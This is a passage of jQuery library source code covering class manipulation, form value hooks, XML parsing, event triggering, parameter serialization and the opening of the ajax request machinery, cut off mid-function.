						cur = this.nodeType === 1 && ( " " + stripAndCollapse( curValue ) + " " );

						if ( cur ) {
							for ( i = 0; i < classNames.length; i++ ) {
								className = classNames[ i ];
								if ( cur.indexOf( " " + className + " " ) < 0 ) {
									cur += className + " ";
								}
							}

							// Only assign if different to avoid unneeded rendering.
							finalValue = stripAndCollapse( cur );
							if ( curValue !== finalValue ) {
								this.setAttribute( "class", finalValue );
							}
						}
					} );
				}

				return this;
			},

			removeClass: function( value ) {
				var classNames, cur, curValue, className, i, finalValue;

				if ( isFunction( value ) ) {
					return this.each( function( j ) {
						jQuery( this ).removeClass( value.call( this, j, getClass( this ) ) );
					} );
				}

				if ( !arguments.length ) {
					return this.attr( "class", "" );
				}

				classNames = classesToArray( value );

				if ( classNames.length ) {
					return this.each( function() {
						curValue = getClass( this );

						// This expression is here for better compressibility (see addClass)
						cur = this.nodeType === 1 && ( " " + stripAndCollapse( curValue ) + " " );

						if ( cur ) {
							for ( i = 0; i < classNames.length; i++ ) {
								className = classNames[ i ];

								// Remove *all* instances
								while ( cur.indexOf( " " + className + " " ) > -1 ) {
									cur = cur.replace( " " + className + " ", " " );
								}
							}

							// Only assign if different to avoid unneeded rendering.
							finalValue = stripAndCollapse( cur );
							if ( curValue !== finalValue ) {
								this.setAttribute( "class", finalValue );
							}
						}
					} );
				}

				return this;
			},

			toggleClass: function( value, stateVal ) {
				var classNames, className, i, self,
					type = typeof value,
					isValidValue = type === "string" || Array.isArray( value );

				if ( isFunction( value ) ) {
					return this.each( function( i ) {
						jQuery( this ).toggleClass(
							value.call( this, i, getClass( this ), stateVal ),
							stateVal
						);
					} );
				}

				if ( typeof stateVal === "boolean" && isValidValue ) {
					return stateVal ? this.addClass( value ) : this.removeClass( value );
				}

				classNames = classesToArray( value );

				return this.each( function() {
					if ( isValidValue ) {

						// Toggle individual class names
						self = jQuery( this );

						for ( i = 0; i < classNames.length; i++ ) {
							className = classNames[ i ];

							// Check each className given, space separated list
							if ( self.hasClass( className ) ) {
								self.removeClass( className );
							} else {
								self.addClass( className );
							}
						}

					// Toggle whole class name
					} else if ( value === undefined || type === "boolean" ) {
						className = getClass( this );
						if ( className ) {

							// Store className if set
							dataPriv.set( this, "__className__", className );
						}

						// If the element has a class name or if we're passed `false`,
						// then remove the whole classname (if there was one, the above saved it).
						// Otherwise bring back whatever was previously saved (if anything),
						// falling back to the empty string if nothing was stored.
						if ( this.setAttribute ) {
							this.setAttribute( "class",
								className || value === false ?
									"" :
									dataPriv.get( this, "__className__" ) || ""
							);
						}
					}
				} );
			},

			hasClass: function( selector ) {
				var className, elem,
					i = 0;

				className = " " + selector + " ";
				while ( ( elem = this[ i++ ] ) ) {
					if ( elem.nodeType === 1 &&
						( " " + stripAndCollapse( getClass( elem ) ) + " " ).indexOf( className ) > -1 ) {
						return true;
					}
				}

				return false;
			}
		} );




		var rreturn = /\r/g;

		jQuery.fn.extend( {
			val: function( value ) {
				var hooks, ret, valueIsFunction,
					elem = this[ 0 ];

				if ( !arguments.length ) {
					if ( elem ) {
						hooks = jQuery.valHooks[ elem.type ] ||
							jQuery.valHooks[ elem.nodeName.toLowerCase() ];

						if ( hooks &&
							"get" in hooks &&
							( ret = hooks.get( elem, "value" ) ) !== undefined
						) {
							return ret;
						}

						ret = elem.value;

						// Handle most common string cases
						if ( typeof ret === "string" ) {
							return ret.replace( rreturn, "" );
						}

						// Handle cases where value is null/undef or number
						return ret == null ? "" : ret;
					}

					return;
				}

				valueIsFunction = isFunction( value );

				return this.each( function( i ) {
					var val;

					if ( this.nodeType !== 1 ) {
						return;
					}

					if ( valueIsFunction ) {
						val = value.call( this, i, jQuery( this ).val() );
					} else {
						val = value;
					}

					// Treat null/undefined as ""; convert numbers to string
					if ( val == null ) {
						val = "";

					} else if ( typeof val === "number" ) {
						val += "";

					} else if ( Array.isArray( val ) ) {
						val = jQuery.map( val, function( value ) {
							return value == null ? "" : value + "";
						} );
					}

					hooks = jQuery.valHooks[ this.type ] || jQuery.valHooks[ this.nodeName.toLowerCase() ];

					// If set returns undefined, fall back to normal setting
					if ( !hooks || !( "set" in hooks ) || hooks.set( this, val, "value" ) === undefined ) {
						this.value = val;
					}
				} );
			}
		} );

		jQuery.extend( {
			valHooks: {
				option: {
					get: function( elem ) {

						var val = jQuery.find.attr( elem, "value" );
						return val != null ?
							val :

							// Support: IE <=10 - 11 only
							// option.text throws exceptions (trac-14686, trac-14858)
							// Strip and collapse whitespace
							// https://html.spec.whatwg.org/#strip-and-collapse-whitespace
							stripAndCollapse( jQuery.text( elem ) );
					}
				},
				select: {
					get: function( elem ) {
						var value, option, i,
							options = elem.options,
							index = elem.selectedIndex,
							one = elem.type === "select-one",
							values = one ? null : [],
							max = one ? index + 1 : options.length;

						if ( index < 0 ) {
							i = max;

						} else {
							i = one ? index : 0;
						}

						// Loop through all the selected options
						for ( ; i < max; i++ ) {
							option = options[ i ];

							// Support: IE <=9 only
							// IE8-9 doesn't update selected after form reset (trac-2551)
							if ( ( option.selected || i === index ) &&

									// Don't return options that are disabled or in a disabled optgroup
									!option.disabled &&
									( !option.parentNode.disabled ||
										!nodeName( option.parentNode, "optgroup" ) ) ) {

								// Get the specific value for the option
								value = jQuery( option ).val();

								// We don't need an array for one selects
								if ( one ) {
									return value;
								}

								// Multi-Selects return an array
								values.push( value );
							}
						}

						return values;
					},

					set: function( elem, value ) {
						var optionSet, option,
							options = elem.options,
							values = jQuery.makeArray( value ),
							i = options.length;

						while ( i-- ) {
							option = options[ i ];

							/* eslint-disable no-cond-assign */

							if ( option.selected =
								jQuery.inArray( jQuery.valHooks.option.get( option ), values ) > -1
							) {
								optionSet = true;
							}

							/* eslint-enable no-cond-assign */
						}

						// Force browsers to behave consistently when non-matching value is set
						if ( !optionSet ) {
							elem.selectedIndex = -1;
						}
						return values;
					}
				}
			}
		} );

		// Radios and checkboxes getter/setter
		jQuery.each( [ "radio", "checkbox" ], function() {
			jQuery.valHooks[ this ] = {
				set: function( elem, value ) {
					if ( Array.isArray( value ) ) {
						return ( elem.checked = jQuery.inArray( jQuery( elem ).val(), value ) > -1 );
					}
				}
			};
			if ( !support.checkOn ) {
				jQuery.valHooks[ this ].get = function( elem ) {
					return elem.getAttribute( "value" ) === null ? "on" : elem.value;
				};
			}
		} );




		// Return jQuery for attributes-only inclusion
		var location = window.location;

		var nonce = { guid: Date.now() };

		var rquery = ( /\?/ );



		// Cross-browser xml parsing
		jQuery.parseXML = function( data ) {
			var xml, parserErrorElem;
			if ( !data || typeof data !== "string" ) {
				return null;
			}

			// Support: IE 9 - 11 only
			// IE throws on parseFromString with invalid input.
			try {
				xml = ( new window.DOMParser() ).parseFromString( data, "text/xml" );
			} catch ( e ) {}

			parserErrorElem = xml && xml.getElementsByTagName( "parsererror" )[ 0 ];
			if ( !xml || parserErrorElem ) {
				jQuery.error( "Invalid XML: " + (
					parserErrorElem ?
						jQuery.map( parserErrorElem.childNodes, function( el ) {
							return el.textContent;
						} ).join( "\n" ) :
						data
				) );
			}
			return xml;
		};


		var rfocusMorph = /^(?:focusinfocus|focusoutblur)$/,
			stopPropagationCallback = function( e ) {
				e.stopPropagation();
			};

		jQuery.extend( jQuery.event, {

			trigger: function( event, data, elem, onlyHandlers ) {

				var i, cur, tmp, bubbleType, ontype, handle, special, lastElement,
					eventPath = [ elem || document ],
					type = hasOwn.call( event, "type" ) ? event.type : event,
					namespaces = hasOwn.call( event, "namespace" ) ? event.namespace.split( "." ) : [];

				cur = lastElement = tmp = elem = elem || document;

				// Don't do events on text and comment nodes
				if ( elem.nodeType === 3 || elem.nodeType === 8 ) {
					return;
				}

				// focus/blur morphs to focusin/out; ensure we're not firing them right now
				if ( rfocusMorph.test( type + jQuery.event.triggered ) ) {
					return;
				}

				if ( type.indexOf( "." ) > -1 ) {

					// Namespaced trigger; create a regexp to match event type in handle()
					namespaces = type.split( "." );
					type = namespaces.shift();
					namespaces.sort();
				}
				ontype = type.indexOf( ":" ) < 0 && "on" + type;

				// Caller can pass in a jQuery.Event object, Object, or just an event type string
				event = event[ jQuery.expando ] ?
					event :
					new jQuery.Event( type, typeof event === "object" && event );

				// Trigger bitmask: & 1 for native handlers; & 2 for jQuery (always true)
				event.isTrigger = onlyHandlers ? 2 : 3;
				event.namespace = namespaces.join( "." );
				event.rnamespace = event.namespace ?
					new RegExp( "(^|\\.)" + namespaces.join( "\\.(?:.*\\.|)" ) + "(\\.|$)" ) :
					null;

				// Clean up the event in case it is being reused
				event.result = undefined;
				if ( !event.target ) {
					event.target = elem;
				}

				// Clone any incoming data and prepend the event, creating the handler arg list
				data = data == null ?
					[ event ] :
					jQuery.makeArray( data, [ event ] );

				// Allow special events to draw outside the lines
				special = jQuery.event.special[ type ] || {};
				if ( !onlyHandlers && special.trigger && special.trigger.apply( elem, data ) === false ) {
					return;
				}

				// Determine event propagation path in advance, per W3C events spec (trac-9951)
				// Bubble up to document, then to window; watch for a global ownerDocument var (trac-9724)
				if ( !onlyHandlers && !special.noBubble && !isWindow( elem ) ) {

					bubbleType = special.delegateType || type;
					if ( !rfocusMorph.test( bubbleType + type ) ) {
						cur = cur.parentNode;
					}
					for ( ; cur; cur = cur.parentNode ) {
						eventPath.push( cur );
						tmp = cur;
					}

					// Only add window if we got to document (e.g., not plain obj or detached DOM)
					if ( tmp === ( elem.ownerDocument || document ) ) {
						eventPath.push( tmp.defaultView || tmp.parentWindow || window );
					}
				}

				// Fire handlers on the event path
				i = 0;
				while ( ( cur = eventPath[ i++ ] ) && !event.isPropagationStopped() ) {
					lastElement = cur;
					event.type = i > 1 ?
						bubbleType :
						special.bindType || type;

					// jQuery handler
					handle = ( dataPriv.get( cur, "events" ) || Object.create( null ) )[ event.type ] &&
						dataPriv.get( cur, "handle" );
					if ( handle ) {
						handle.apply( cur, data );
					}

					// Native handler
					handle = ontype && cur[ ontype ];
					if ( handle && handle.apply && acceptData( cur ) ) {
						event.result = handle.apply( cur, data );
						if ( event.result === false ) {
							event.preventDefault();
						}
					}
				}
				event.type = type;

				// If nobody prevented the default action, do it now
				if ( !onlyHandlers && !event.isDefaultPrevented() ) {

					if ( ( !special._default ||
						special._default.apply( eventPath.pop(), data ) === false ) &&
						acceptData( elem ) ) {

						// Call a native DOM method on the target with the same name as the event.
						// Don't do default actions on window, that's where global variables be (trac-6170)
						if ( ontype && isFunction( elem[ type ] ) && !isWindow( elem ) ) {

							// Don't re-trigger an onFOO event when we call its FOO() method
							tmp = elem[ ontype ];

							if ( tmp ) {
								elem[ ontype ] = null;
							}

							// Prevent re-triggering of the same event, since we already bubbled it above
							jQuery.event.triggered = type;

							if ( event.isPropagationStopped() ) {
								lastElement.addEventListener( type, stopPropagationCallback );
							}

							elem[ type ]();

							if ( event.isPropagationStopped() ) {
								lastElement.removeEventListener( type, stopPropagationCallback );
							}

							jQuery.event.triggered = undefined;

							if ( tmp ) {
								elem[ ontype ] = tmp;
							}
						}
					}
				}

				return event.result;
			},

			// Piggyback on a donor event to simulate a different one
			// Used only for `focus(in | out)` events
			simulate: function( type, elem, event ) {
				var e = jQuery.extend(
					new jQuery.Event(),
					event,
					{
						type: type,
						isSimulated: true
					}
				);

				jQuery.event.trigger( e, null, elem );
			}

		} );

		jQuery.fn.extend( {

			trigger: function( type, data ) {
				return this.each( function() {
					jQuery.event.trigger( type, data, this );
				} );
			},
			triggerHandler: function( type, data ) {
				var elem = this[ 0 ];
				if ( elem ) {
					return jQuery.event.trigger( type, data, elem, true );
				}
			}
		} );


		var
			rbracket = /\[\]$/,
			rCRLF = /\r?\n/g,
			rsubmitterTypes = /^(?:submit|button|image|reset|file)$/i,
			rsubmittable = /^(?:input|select|textarea|keygen)/i;

		function buildParams( prefix, obj, traditional, add ) {
			var name;

			if ( Array.isArray( obj ) ) {

				// Serialize array item.
				jQuery.each( obj, function( i, v ) {
					if ( traditional || rbracket.test( prefix ) ) {

						// Treat each array item as a scalar.
						add( prefix, v );

					} else {

						// Item is non-scalar (array or object), encode its numeric index.
						buildParams(
							prefix + "[" + ( typeof v === "object" && v != null ? i : "" ) + "]",
							v,
							traditional,
							add
						);
					}
				} );

			} else if ( !traditional && toType( obj ) === "object" ) {

				// Serialize object item.
				for ( name in obj ) {
					buildParams( prefix + "[" + name + "]", obj[ name ], traditional, add );
				}

			} else {

				// Serialize scalar item.
				add( prefix, obj );
			}
		}

		// Serialize an array of form elements or a set of
		// key/values into a query string
		jQuery.param = function( a, traditional ) {
			var prefix,
				s = [],
				add = function( key, valueOrFunction ) {

					// If value is a function, invoke it and use its return value
					var value = isFunction( valueOrFunction ) ?
						valueOrFunction() :
						valueOrFunction;

					s[ s.length ] = encodeURIComponent( key ) + "=" +
						encodeURIComponent( value == null ? "" : value );
				};

			if ( a == null ) {
				return "";
			}

			// If an array was passed in, assume that it is an array of form elements.
			if ( Array.isArray( a ) || ( a.jquery && !jQuery.isPlainObject( a ) ) ) {

				// Serialize the form elements
				jQuery.each( a, function() {
					add( this.name, this.value );
				} );

			} else {

				// If traditional, encode the "old" way (the way 1.3.2 or older
				// did it), otherwise encode params recursively.
				for ( prefix in a ) {
					buildParams( prefix, a[ prefix ], traditional, add );
				}
			}

			// Return the resulting serialization
			return s.join( "&" );
		};

		jQuery.fn.extend( {
			serialize: function() {
				return jQuery.param( this.serializeArray() );
			},
			serializeArray: function() {
				return this.map( function() {

					// Can add propHook for "elements" to filter or add form elements
					var elements = jQuery.prop( this, "elements" );
					return elements ? jQuery.makeArray( elements ) : this;
				} ).filter( function() {
					var type = this.type;

					// Use .is( ":disabled" ) so that fieldset[disabled] works
					return this.name && !jQuery( this ).is( ":disabled" ) &&
						rsubmittable.test( this.nodeName ) && !rsubmitterTypes.test( type ) &&
						( this.checked || !rcheckableType.test( type ) );
				} ).map( function( _i, elem ) {
					var val = jQuery( this ).val();

					if ( val == null ) {
						return null;
					}

					if ( Array.isArray( val ) ) {
						return jQuery.map( val, function( val ) {
							return { name: elem.name, value: val.replace( rCRLF, "\r\n" ) };
						} );
					}

					return { name: elem.name, value: val.replace( rCRLF, "\r\n" ) };
				} ).get();
			}
		} );


		var
			r20 = /%20/g,
			rhash = /#.*$/,
			rantiCache = /([?&])_=[^&]*/,
			rheaders = /^(.*?):[ \t]*([^\r\n]*)$/mg,

			// trac-7653, trac-8125, trac-8152: local protocol detection
			rlocalProtocol = /^(?:about|app|app-storage|.+-extension|file|res|widget):$/,
			rnoContent = /^(?:GET|HEAD)$/,
			rprotocol = /^\/\//,

			/* Prefilters
			 * 1) They are useful to introduce custom dataTypes (see ajax/jsonp.js for an example)
			 * 2) These are called:
			 *    - BEFORE asking for a transport
			 *    - AFTER param serialization (s.data is a string if s.processData is true)
			 * 3) key is the dataType
			 * 4) the catchall symbol "*" can be used
			 * 5) execution will start with transport dataType and THEN continue down to "*" if needed
			 */
			prefilters = {},

			/* Transports bindings
			 * 1) key is the dataType
			 * 2) the catchall symbol "*" can be used
			 * 3) selection will start with transport dataType and THEN go to "*" if needed
			 */
			transports = {},

			// Avoid comment-prolog char sequence (trac-10098); must appease lint and evade compression
			allTypes = "*/".concat( "*" ),

			// Anchor tag for parsing the document origin
			originAnchor = document.createElement( "a" );

		originAnchor.href = location.href;

		// Base "constructor" for jQuery.ajaxPrefilter and jQuery.ajaxTransport
		function addToPrefiltersOrTransports( structure ) {

			// dataTypeExpression is optional and defaults to "*"
			return function( dataTypeExpression, func ) {

				if ( typeof dataTypeExpression !== "string" ) {
					func = dataTypeExpression;
					dataTypeExpression = "*";
				}

				var dataType,
					i = 0,
					dataTypes = dataTypeExpression.toLowerCase().match( rnothtmlwhite ) || [];

				if ( isFunction( func ) ) {

					// For each dataType in the dataTypeExpression
					while ( ( dataType = dataTypes[ i++ ] ) ) {

						// Prepend if requested
						if ( dataType[ 0 ] === "+" ) {
							dataType = dataType.slice( 1 ) || "*";
							( structure[ dataType ] = structure[ dataType ] || [] ).unshift( func );

						// Otherwise append
						} else {
							( structure[ dataType ] = structure[ dataType ] || [] ).push( func );
						}
					}
				}
			};
		}

		// Base inspection function for prefilters and transports
		function inspectPrefiltersOrTransports( structure, options, originalOptions, jqXHR ) {

			var inspected = {},
				seekingTransport = ( structure === transports );

			function inspect( dataType ) {
				var selected;
				inspected[ dataType ] = true;
				jQuery.each( structure[ dataType ] || [], function( _, prefilterOrFactory ) {
					var dataTypeOrTransport = prefilterOrFactory( options, originalOptions, jqXHR );
					if ( typeof dataTypeOrTransport === "string" &&
						!seekingTransport && !inspected[ dataTypeOrTransport ] ) {

						options.dataTypes.unshift( dataTypeOrTransport );
						inspect( dataTypeOrTransport );
						return false;
					} else if ( seekingTransport ) {
						return !( selected = dataTypeOrTransport );
					}
				} );
				return selected;
			}

			return inspect( options.dataTypes[ 0 ] ) || !inspected[ "*" ] && inspect( "*" );
		}

		// A special extend for ajax options
		// that takes "flat" options (not to be deep extended)
		// Fixes trac-9887
		function ajaxExtend( target, src ) {
			var key, deep,
				flatOptions = jQuery.ajaxSettings.flatOptions || {};

			for ( key in src ) {
				if ( src[ key ] !== undefined ) {
					( flatOptions[ key ] ? target : ( deep || ( deep = {} ) ) )[ key ] = src[ key ];
				}
			}
			if ( deep ) {
				jQuery.extend( true, target, deep );
			}

			return target;
		}

		/* Handles responses to an ajax request:
		 * - finds the right dataType (mediates between content-type and expected dataType)
		 * - returns the corresponding response
		 */
		function ajaxHandleResponses( s, jqXHR, responses ) {

			var ct, type, finalDataType, firstDataType,
				contents = s.contents,
				dataTypes = s.dataTypes;

			// Remove auto dataType and get content-type in the process
			while ( dataTypes[ 0 ] === "*" ) {
				dataTypes.shift();
				if ( ct === undefined ) {
					ct = s.mimeType || jqXHR.getResponseHeader( "Content-Type" );
				}
			}

			// Check if we're dealing with a known content-type
			if ( ct ) {
				for ( type in contents ) {
					if ( contents[ type ] && contents[ type ].test( ct ) ) {
						dataTypes.unshift( type );
						break;
					}
				}
			}

			// Check to see if we have a response for the expected dataType
			if ( dataTypes[ 0 ] in responses ) {
				finalDataType = dataTypes[ 0 ];
			} else {

				// Try convertible dataTypes
				for ( type in responses ) {
					if ( !dataTypes[ 0 ] || s.converters[ type + " " + dataTypes[ 0 ] ] ) {
						finalDataType = type;
						break;
					}
					if ( !firstDataType ) {
						firstDataType = type;
					}
				}

				// Or just use first one
				finalDataType = finalDataType || firstDataType;
			}

			// If we found a dataType
			// We add the dataType to the list if needed
			// and return the corresponding response
			if ( finalDataType ) {
				if ( finalDataType !== dataTypes[ 0 ] ) {
					dataTypes.unshift( finalDataType );
				}
				return responses[ finalDataType ];
			}
		}

		/* Chain conversions given the request and the original response
		 * Also sets the responseXXX fields on the jqXHR instance
		 */
		function ajaxConvert( s, response, jqXHR, isSuccess ) {
			var conv2, current, conv, tmp, prev,
				converters = {},

				// Work with a copy of dataTypes in case we need to modify it for conversion
				dataTypes = s.dataTypes.slice();

			// Create converters map with lowercased keys
			if ( dataTypes[ 1 ] ) {
				for ( conv in s.converters ) {
					converters[ conv.toLowerCase() ] = s.converters[ conv ];
				}
			}

			current = dataTypes.shift();

			// Convert to each sequential dataType
			while ( current ) {

				if ( s.responseFields[ current ] ) {
					jqXHR[ s.responseFields[ current ] ] = response;
				}

				// Apply the dataFilter if provided
				if ( !prev && isSuccess && s.dataFilter ) {
					response = s.dataFilter( response, s.dataType );
				}

				prev = current;
				current = dataTypes.shift();

				if ( current ) {

					// There's only work to do if current dataType is non-auto
					if ( current === "*" ) {

						current = prev;

					// Convert response if prev dataType is non-auto and differs from current
					} else if ( prev !== "*" && prev !== current ) {

						// Seek a direct converter
						conv = converters[ prev + " " + current ] || converters[ "* " + current ];

						// If none found, seek a pair
						if ( !conv ) {
							for ( conv2 in converters ) {

								// If conv2 outputs current
								tmp = conv2.split( " " );
								if ( tmp[ 1 ] === current ) {

									// If prev can be converted to accepted input
									conv = converters[ prev + " " + tmp[ 0 ] ] ||
										converters[ "* " + tmp[ 0 ] ];
									if ( conv ) {

										// Condense equivalence converters
										if ( conv === true ) {
											conv = converters[ conv2 ];

										// Otherwise, insert the intermediate dataType
										} else if ( converters[ conv2 ] !== true ) {
											current = tmp[ 0 ];
											dataTypes.unshift( tmp[ 1 ] );
										}
										break;
									}
								}
							}
						}

						// Apply converter (if not an equivalence)
						if ( conv !== true ) {

							// Unless errors are allowed to bubble, catch and return them
							if ( conv && s.throws ) {
								response = conv( response );
							} else {
								try {
									response = conv( response );
								} catch ( e ) {
									return {
										state: "parsererror",
										error: conv ? e : "No conversion from " + prev + " to " + current
									};
								}
							}
						}
					}
				}
			}

			return { state: "success", data: response };
		}

		jQuery.extend( {

			// Counter for holding the number of active queries
			active: 0,

			// Last-Modified header cache for next request
			lastModified: {},
			etag: {},

			ajaxSettings: {
				url: location.href,
				type: "GET",
				isLocal: rlocalProtocol.test( location.protocol ),
				global: true,
				processData: true,
				async: true,
				contentType: "application/x-www-form-urlencoded; charset=UTF-8",

				/*
				timeout: 0,
				data: null,
				dataType: null,
				username: null,
				password: null,
				cache: null,
				throws: false,
				traditional: false,
				headers: {},
				*/

				accepts: {
					"*": allTypes,
					text: "text/plain",
					html: "text/html",
					xml: "application/xml, text/xml",
					json: "application/json, text/javascript"
				},

				contents: {
					xml: /\bxml\b/,
					html: /\bhtml/,
					json: /\bjson\b/
				},

				responseFields: {
					xml: "responseXML",
					text: "responseText",
					json: "responseJSON"
				},

				// Data converters
				// Keys separate source (or catchall "*") and destination types with a single space
				converters: {

					// Convert anything to text
					"* text": String,

					// Text to html (true = no transformation)
					"text html": true,

					// Evaluate text as a json expression
					"text json": JSON.parse,

					// Parse text as xml
					"text xml": jQuery.parseXML
				},

				// For options that shouldn't be deep extended:
				// you can add your own custom options here if
				// and when you create one that shouldn't be
				// deep extended (see ajaxExtend)
				flatOptions: {
					url: true,
					context: true
				}
			},

			// Creates a full fledged settings object into target
			// with both ajaxSettings and settings fields.
			// If target is omitted, writes into ajaxSettings.
			ajaxSetup: function( target, settings ) {
				return settings ?

					// Building a settings object
					ajaxExtend( ajaxExtend( target, jQuery.ajaxSettings ), settings ) :

					// Extending ajaxSettings
					ajaxExtend( jQuery.ajaxSettings, target );
			},

			ajaxPrefilter: addToPrefiltersOrTransports( prefilters ),
			ajaxTransport: addToPrefiltersOrTransports( transports ),

			// Main method
			ajax: function( url, options ) {

				// If url is an object, simulate pre-1.5 signature
				if ( typeof url === "object" ) {
					options = url;
					url = undefined;
				}

				// Force options to be an object
				options = options || {};

				var transport,

					// URL without anti-cache param
					cacheURL,

					// Response headers
					responseHeadersString,
					responseHeaders,

					// timeout handle
					timeoutTimer,

					// Url cleanup var
					urlAnchor,

					// Request state (becomes false upon send and true upon completion)
					completed,

					// To know if global events are to be dispatched
					fireGlobals,

					// Loop variable
					i,

					// uncached part of the url
					uncached,

					// Create the final options object
					s = jQuery.ajaxSetup( {}, options ),

					// Callbacks context
					callbackContext = s.context || s,

					// Context for global events is callbackContext if it is a DOM node or jQuery collection
					globalEventContext = s.context &&
						( callbackContext.nodeType || callbackContext.jquery ) ?
						jQuery( callbackContext ) :
						jQuery.event,

					// Deferreds
					deferred = jQuery.Deferred(),
					completeDeferred = jQuery.Callbacks( "once memory" ),

					// Status-dependent callbacks
					statusCode = s.statusCode || {},

					// Headers (they are sent all at once)
					requestHeaders = {},
					requestHeadersNames = {},

					// Default abort message
					strAbort = "canceled",

					// Fake xhr
					jqXHR = {
						readyState: 0,

						// Builds headers hashtable if needed
						getResponseHeader: function( key ) {
							var match;
							if ( completed ) {
								if ( !responseHeaders ) {
									responseHeaders = {};
									while ( ( match = rheaders.exec( responseHeadersString ) ) ) {
										responseHeaders[ match[ 1 ].toLowerCase() + " " ] =
											( responseHeaders[ match[ 1 ].toLowerCase() + " " ] || [] )
												.concat( match[ 2 ] );
									}
								}
								match = responseHeaders[ key.toLowerCase() + " " ];
							}
							return match == null ? null : match.join( ", " );
						},

						// Raw string
						getAllResponseHeaders: function() {
							return completed ? responseHeadersString : null;
						},

						// Caches the header
						setRequestHeader: function( name, value ) {
							if ( completed == null ) {
								name = requestHeadersNames[ name.toLowerCase() ] =
									requestHeadersNames[ name.toLowerCase() ] || name;
								requestHeaders[ name ] = value;
							}
							return this;
						},

						// Overrides response content-type header
						overrideMimeType: function( type ) {
							if ( completed == null ) {
								s.mimeType = type;
							}
							return this;
						},

						// Status-dependent callbacks
						statusCode: function( map ) {
							var code;
							if ( map ) {
								if ( completed ) {

									// Execute the appropriate callbacks
									jqXHR.always( map[ jqXHR.status ] );
								} else {

									// Lazy-add the new callbacks in a way that preserves old ones
									for ( code in map ) {
										statusCode[ code ] = [ statusCode[ code ], map[ code ] ];
									}
								}
							}
							return this;
						},

						// Cancel the request
						abort: function( statusText ) {
							var finalText = statusText || strAbort;
							if ( transport ) {
								transport.abort( finalText );
							}
							done( 0, finalText );
							return this;
						}
					};

				// Attach deferreds
				deferred.promise( jqXHR );

				// Add protocol if not provided (prefilters might expect it)
				// Handle falsy url in the settings object (trac-10093: consistency with old signature)
				// We also use the url parameter if available
				s.url = ( ( url || s.url || location.href ) + "" )
					.replace( rprotocol, location.protocol + "//" );

				// Alias method option to type as per ticket trac-12004
				s.type = options.method || options.type || s.method || s.type;

				// Extract dataTypes list
				s.dataTypes = ( s.dataType || "*" ).toLowerCase().match( rnothtmlwhite ) || [ "" ];

				// A cross-domain request is in order when the origin doesn't match the current origin.
				if ( s.crossDomain == null ) {
					urlAnchor = document.createElement( "a" );

					// Support: IE <=8 - 11, Edge 12 - 15
					// IE throws exception on accessing the href property if url is malformed,
					// e.g. http://example.com:80x/
					try {
						urlAnchor.href = s.url;

						// Support: IE <=8 - 11 only
						// Anchor's host property isn't correctly set when s.url is relative
						urlAnchor.href = urlAnchor.href;
						s.crossDomain = originAnchor.protocol + "//" + originAnchor.host !==
							urlAnchor.protocol + "//" + urlAnchor.host;
					} catch ( e ) {

						// If there is an error parsing the URL, assume it is crossDomain,
						// it can be rejected by the transport if it is invalid
						s.crossDomain = true;
					}
				}

				// Convert data if not already a string
				if ( s.data && s.processData && typeof s.data !== "string" ) {
					s.data = jQuery.param( s.data, s.traditional );
				}

				// Apply prefilters
				inspectPrefiltersOrTransports( prefilters, s, options, jqXHR );

				// If request was aborted inside a prefilter, stop there
				if ( completed ) {
					return jqXHR;
				}

				// We can fire global events as of now if asked to
				// Don't fire events if jQuery.event is undefined in an AMD-usage scenario (trac-15118)
				fireGlobals = jQuery.event && s.global;

				// Watch for a new set of requests
				if ( fireGlobals && jQuery.active++ === 0 ) {
					jQuery.event.trigger( "ajaxStart" );
				}

				// Uppercase the type
				s.type = s.type.toUpperCase();

				// Determine if request has content
				s.hasContent = !rnoContent.test( s.type );

				// Save the URL in case we're toying with the If-Modified-Since
				// and/or If-None-Match header later on
				// Remove hash to simplify url manipulation
				cacheURL = s.url.replace( rhash, "" );

				// More options handling for requests with no content
				if ( !s.hasContent ) {

					// Remember the hash so we can put it back
					uncached = s.url.slice( cacheURL.length );

					// If data is available and should be processed, append data to url
					if ( s.data && ( s.processData || typeof s.data === "string" ) ) {
						cacheURL += ( rquery.test( cacheURL ) ? "&" : "?" ) + s.data;

						// trac-9682: remove data so that it's not used in an eventual retry
						delete s.data;
					}

					// Add or update anti-cache param if needed
					if ( s.cache === false ) {
						cacheURL = cacheURL.replace( rantiCache, "$1" );
						uncached = ( rquery.test( cacheURL ) ? "&" : "?" ) + "_=" + ( nonce.guid++ ) +
							uncached;
					}

					// Put hash and anti-cache on the URL that will be requested (gh-1732)
					s.url = cacheURL + uncached;

				// Change '%20' to '+' if this is encoded form body content (gh-2658)
				} else if ( s.data && s.processData &&
					( s.contentType || "" ).indexOf( "application/x-www-form-urlencoded" ) === 0 ) {
					s.data = s.data.replace( r20, "+" );
				}

				// Set the If-Modified-Since and/or If-None-Match header, if in ifModified mode.
				if ( s.ifModified ) {
					if ( jQuery.lastModified[ cacheURL ] ) {
						jqXHR.setRequestHeader( "If-Modified-Since", jQuery.lastModified[ cacheURL ] );
					}
					if ( jQuery.etag[ cacheURL ] ) {
						jqXHR.setRequestHeader( "If-None-Match", jQuery.etag[ cacheURL ] );
					}
				}

				// Set the correct header, if data is being sent
				if ( s.data && s.hasContent && s.contentType !== false || options.contentType ) {
					jqXHR.setRequestHeader( "Content-Type", s.contentType );
				}

				// Set the Accepts header for the server, depending on the dataType
				jqXHR.setRequestHeader(
					"Accept",
					s.dataTypes[ 0 ] && s.accepts[ s.dataTypes[ 0 ] ] ?
						s.accepts[ s.dataTypes[ 0 ] ] +
							( s.dataTypes[ 0 ] !== "*" ? ", " + allTypes + "; q=0.01" : "" ) :
						s.accepts[ "*" ]
				);

				// Check for headers option
				for ( i in s.headers ) {
					jqXHR.setRequestHeader( i, s.headers[ i ] );
				}

				// Allow custom headers/mimetypes and early abort
				if ( s.beforeSend &&
					( s.beforeSend.call( callbackContext, jqXHR, s ) === false || completed ) ) {

					// Abort if not done already and return
					return jqXHR.abort();
				}

				// Aborting is no longer a cancellation
				strAbort = "abort";

				// Install callbacks on deferreds
				completeDeferred.add( s.complete );
				jqXHR.done( s.success );
				jqXHR.fail( s.error );

				// Get transport
				transport = inspectPrefiltersOrTransports( transports, s, options, jqXHR );

				// If no transport, we auto-abort
				if ( !transport ) {
					done( -1, "No Transport" );
				} else {
					jqXHR.readyState = 1;

					// Send global event
					if ( fireGlobals ) {
						globalEventContext.trigger( "ajaxSend", [ jqXHR, s ] );
					}

					// If request was aborted inside ajaxSend, stop there
					if ( completed ) {
						return jqXHR;
					}

					// Timeout
					if ( s.async && s.timeout > 0 ) {
						timeoutTimer = window.setTimeout( function() {
							jqXHR.abort( "timeout" );
						}, s.timeout );
					}

					try {
						completed = false;
						transport.send( requestHeaders, done );
